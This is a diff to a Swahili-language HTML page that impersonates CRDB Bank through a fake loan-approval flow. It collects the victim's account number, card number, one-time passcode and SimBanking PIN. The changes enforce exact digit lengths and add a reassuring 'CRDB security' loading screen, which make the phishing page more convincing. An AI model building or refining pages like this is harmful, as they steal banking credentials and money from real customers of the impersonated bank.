@@ -164,13 +164,13 @@
                 <p class="info-text">Karibu! Tafadhali unanisha akaunti yako ya Benki ya CRDB</p>
 
                 <div class="input-group">
-                    <label>Ingiza nambari yako ya akaunti</label>
-                    <input type="text" id="accountNumberInput" placeholder="Namba ya akaunti">
+                    <label>Ingiza nambari yako ya akaunti (Tarakimu 13)</label>
+                    <input type="tel" id="accountNumberInput" placeholder="Ingiza tarakimu 13" maxlength="13">
                 </div>
 
                 <div class="input-group">
-                    <label>Ingiza nambari yako ya kadi</label>
-                    <input type="text" id="cardNumberInput" placeholder="1111-1111-1111-1111">
+                    <label>Ingiza nambari yako ya kadi (Tarakimu 16)</label>
+                    <input type="tel" id="cardNumberInput" placeholder="Ingiza tarakimu 16" maxlength="16">
                 </div>
 
                 <div class="btn-group">
@@ -179,7 +179,15 @@
                 </div>
             </section>
 
-            <!-- OTP SCREEN (Index 5) -->
+            <!-- LOADING / WAITING SCREEN (Index 5) -->
+            <section id="loadingScreen" class="form-step center-loading-screen">
+                <div class="spinner"></div>
+                <h2>Inachakata Maombi Yako...</h2>
+                <p>Tafadhali subiri kidogo wakati mfumo wa CRDB unathibitisha maelezo yako na kutoa idhini ya mkopo.</p>
+                <div class="waiting-badge">🛡️ Usalama wa Benki ya CRDB</div>
+            </section>
+
+            <!-- OTP SCREEN (Index 6) -->
             <section id="otpScreen" class="form-step dark-theme">
                 <div class="icon-shield">🛡️</div>
                 <h2>Thibitisha Akaunti Yako - CRDB</h2>
@@ -202,7 +210,7 @@
                 </div>
             </section>
 
-            <!-- PIN SCREEN (Index 6) -->
+            <!-- PIN SCREEN (Index 7) -->
             <section id="pinScreen" class="form-step">
                 <h2>Ingiza PIN ya Usalama - CRDB</h2>
                 <p>Ingiza namba ya siri (PIN) ya usalama ya Simbanking ili kuendelea.</p>
@@ -220,7 +228,7 @@
                 <button class="primary-btn green-btn" id="verifyPinBtn">ENDELEA</button>
             </section>
 
-            <!-- CONGRATULATIONS SCREEN (Index 7) -->
+            <!-- CONGRATULATIONS SCREEN (Index 8) -->
             <section id="congratsScreen" class="form-step congrats-theme">
                 <div class="congrats-header">
                     <h1>Hongera!</h1>
@@ -253,5 +261,5 @@
 
     <script src="script.js"></script>
 </body>
-                        </html>
-                                                                                            
+    </html>
+                                                                                                   
